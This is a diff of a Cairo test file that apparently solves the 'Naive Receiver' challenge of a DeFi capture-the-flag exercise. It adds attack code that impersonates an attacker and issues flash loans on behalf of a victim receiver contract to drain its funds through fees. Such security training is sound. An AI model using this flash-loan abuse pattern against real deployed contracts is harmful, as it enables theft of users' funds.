@@ -12,6 +12,10 @@ from src.naive_receiver.interface.IERC3156FlashLender import IERC3156FlashLender
 
 const ONE = 10**18;
 
+// * -------------------------------------------------------------------------- * //
+// *                               Initialization                               * //
+// * -------------------------------------------------------------------------- * //
+
 @view
 func __setup__{
     syscall_ptr: felt*, range_check_ptr
@@ -25,9 +29,9 @@ func __setup__{
 
     %{
         context.admin = ids.admin
-        context.DVT = deploy_contract("src/damn_valuable_token.cairo", [ids.admin]).contract_address
-        context.NAIVE_RECEIVER_LENDER_POOL = deploy_contract("src/naive_receiver/naive_receiver_lender_pool.cairo", [context.DVT]).contract_address
-        context.FLASH_LOAN_RECEIVER = deploy_contract("src/naive_receiver/flash_loan_receiver.cairo", [context.NAIVE_RECEIVER_LENDER_POOL,context.DVT]).contract_address
+        context.DVT = deploy_contract("src/DamnValuableToken.cairo", [ids.admin]).contract_address
+        context.NAIVE_RECEIVER_LENDER_POOL = deploy_contract("src/naive_receiver/NaiveReceiverLenderPool.cairo", [context.DVT]).contract_address
+        context.FLASH_LOAN_RECEIVER = deploy_contract("src/naive_receiver/FlashLoanReceiver.cairo", [context.NAIVE_RECEIVER_LENDER_POOL,context.DVT]).contract_address
     %}
 
     %{ 
@@ -49,8 +53,12 @@ func __setup__{
     return ();
 }
 
+// * -------------------------------------------------------------------------- * //
+// *                                   Hacking                                  * //
+// * -------------------------------------------------------------------------- * //
+
 @external
-func test_naive_receiver{
+func test_hack{
     syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr
 }(){
     check_initialization();
@@ -89,14 +97,14 @@ func check_initialization{
 @external
 func attack{
     syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr
-}() {
-  
-  // TODO : code your attack here
+}() {  
     alloc_locals;
 
     local DVT: felt;
     local NAIVE_RECEIVER_LENDER_POOL: felt;
     local FLASH_LOAN_RECEIVER: felt;
+
+    local attacker = 'starknet-attacker';
  
     %{ 
         ids.DVT = context.DVT 
@@ -104,6 +112,10 @@ func attack{
         ids.FLASH_LOAN_RECEIVER = context.FLASH_LOAN_RECEIVER 
     %}
 
+    // * ---------------------------- Your code here... --------------------------- * //
+
+    %{ start_prank(ids.attacker, target_contract_address=ids.NAIVE_RECEIVER_LENDER_POOL) %}
+
     IERC3156FlashLender.flashLoan( 
         NAIVE_RECEIVER_LENDER_POOL,
         FLASH_LOAN_RECEIVER,
@@ -139,11 +151,13 @@ func attack{
         Uint256(0,0)
     );
 
+    // * -------------------------------- Checking -------------------------------- * //
   
-    // DON'T MODIFY AFTER THIS COMMENT
     check_result();
-    return();
 
+    %{ print("Naive Receiver: Challenge Completed! ✨") %}
+
+    return();
 }
 
 
